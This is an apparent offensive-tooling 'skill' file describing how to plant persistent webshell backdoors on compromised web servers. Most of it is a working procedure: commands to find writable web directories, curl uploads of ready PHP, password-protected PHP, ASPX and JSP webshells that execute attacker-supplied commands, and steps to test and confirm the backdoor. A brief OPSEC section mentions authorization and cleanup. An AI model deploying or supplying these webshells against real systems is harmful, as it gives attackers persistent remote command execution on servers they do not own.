---
name: webshell-deploy
description: Deploy webshell for persistent backdoor access
version: 1.0.0
phase: post
category: post-exploitation
tags: [webshell, backdoor, persistence, php, asp, jsp]
tools: [curl]
difficulty: basic
opsec_level: high
time_estimate: 1m
severity_if_found: critical
related_skills:
  - reverse-shell
  - persistence
mitre_attack:
  - T1505.003
  - T1190
---

## When to Use

Use this skill to deploy a webshell on a compromised web server for persistent
backdoor access. This confirms the attacker can maintain access after initial
compromise via file upload or write access.

## Prerequisites

- Write access to web-accessible directory
- curl for file upload
- Knowledge of web server technology (PHP, ASP, JSP)

## Procedure

```bash
# 1. Identify web root and writable directories
find /var/www/ -writable -type d 2>/dev/null | head -10
ls -la /var/www/html/uploads/ 2>/dev/null

# 2. Deploy PHP webshell (minimal)
curl -sk -X POST "https://TARGET/uploads/shell.php" \
  -F "file=@-;filename=shell.php" \
  <<< '<?php system($_GET["cmd"]); ?>'

# 3. Deploy PHP webshell with password protection
curl -sk -X POST "https://TARGET/uploads/shell.php" \
  -F "file=@-;filename=shell.php" \
  <<< '<?php if($_GET["p"]=="secret"){system($_GET["cmd"]);} ?>'

# 4. Deploy ASPX webshell (Windows)
curl -sk -X POST "https://TARGET/uploads/shell.aspx" \
  -F "file=@-;filename=shell.aspx" \
  <<< '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start("cmd.exe","/c "+Request["cmd"]); %>'

# 5. Deploy JSP webshell (Java)
curl -sk -X POST "https://TARGET/uploads/shell.jsp" \
  -F "file=@-;filename=shell.jsp" \
  <<< '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'

# 6. Test webshell execution
curl -sk "https://TARGET/uploads/shell.php?cmd=id"
curl -sk "https://TARGET/uploads/shell.php?p=secret&cmd=whoami"

# 7. Verify persistence across requests
curl -sk "https://TARGET/uploads/shell.php?cmd=hostname"
sleep 5
curl -sk "https://TARGET/uploads/shell.php?cmd=uptime"
```

## OPSEC Rules

- **CRITICAL**: Deploy only with explicit authorization
- Use password-protected webshells to prevent unauthorized access
- Document exact webshell location for cleanup
- Remove webshell after assessment completion
- Do not deploy webshells on production systems without approval
- Use minimal webshell code (avoid full-featured tools)

## Verification

- Confirm webshell is accessible via HTTP
- Test command execution works
- Verify persistence across multiple requests
- Check if WAF or antivirus detects the webshell

## Pitfalls

- WAF may block file upload or detect webshell content
- Antivirus may quarantine webshell files
- Some PHP configurations disable `system()` function
- File permissions may prevent execution
- Directory may not be web-accessible
- Content-Security-Policy headers may block execution

## Output Format

```
[SHELL] Webshell deployed successfully
  Type: PHP
  Location: https://TARGET/uploads/shell.php
  Password: secret
  Commands: ?p=secret&cmd=id
  Severity: CRITICAL

[SHELL] Persistence confirmed
  Multiple requests successful
  Backdoor active and responding
```
